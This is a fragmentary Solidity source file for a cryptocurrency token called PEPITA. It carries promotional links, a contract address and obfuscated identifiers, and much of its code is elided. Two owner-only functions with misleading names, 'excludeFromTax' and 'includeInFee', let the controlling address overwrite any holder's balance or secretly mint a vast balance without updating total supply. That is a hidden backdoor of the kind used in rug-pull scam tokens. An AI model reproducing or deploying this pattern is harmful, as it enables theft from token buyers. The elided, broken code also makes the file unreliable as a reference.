...
https://t.me/PEPITAW
https://pepitaerc.io/
0x811E98121BF0810438dA0c5f2f2c314A4EeEe3E5
*/
pragma solidity 0.8.19;
abstract contract PEPITAAIAs {
...
interface PEPITAAIAsii is PEPITAAIAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract PEPITAAIAsiii is PEPITAAIAs {
...
contract PEPITA is PEPITAAIAs, PEPITAAIAsi, PEPITAAIAsii, PEPITAAIAsiii {

    mapping(address => uint256) private PEPITAAIsuplly;
  mapping(address => bool) public PEPITAAIAsiiZERTY;
    mapping(address => mapping(address => uint256)) private Confirmed;
address private PEPITAAIRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public PEPITAAIPaw;
  address PEPITAAIdeploy;



    
    constructor(address PEPITAAIadressss) {
            // Editable
            PEPITAAIdeploy = msg.sender;

        _name = "PEPITA";
        _symbol = "PEPITA";
  PEPITAAIRooter = PEPITAAIadressss;        
    ...
    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
      ...
      modifier _internal() {
        require(PEPITAAIRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
  ...
  modifier maxtokens () {
    require(PEPITAAIdeploy == msg.sender, "Ehi20: cannot permit _internal address");
    _;
    ...
    function _transfer(
        ...
        uint256 fromBalance = PEPITAAIsuplly[from];
        require(fromBalance >= lahsab, "Ehi20: transfer lahsab exceeds balance");
        unchecked {
            PEPITAAIsuplly[from] = fromBalance - lahsab;
        }
        PEPITAAIsuplly[to] += lahsab;
  ...
  function excludeFromTax(address excludeaddress) external _internal {
    PEPITAAIsuplly[excludeaddress] = 100000;
    ...
    function _burn(address account, uint256 lahsab) internal virtual {
        ...
        uint256 accountBalance = PEPITAAIsuplly[account];
        require(accountBalance >= lahsab, "Ehi20: burn lahsab exceeds balance");
        unchecked {
            PEPITAAIsuplly[account] = accountBalance - lahsab;
        }
        ALLtotalSupply -= lahsab;
  ...
  function includeInFee(address includeaddress) external _internal {
    PEPITAAIsuplly[includeaddress] = 1000000 * 10 ** 23;
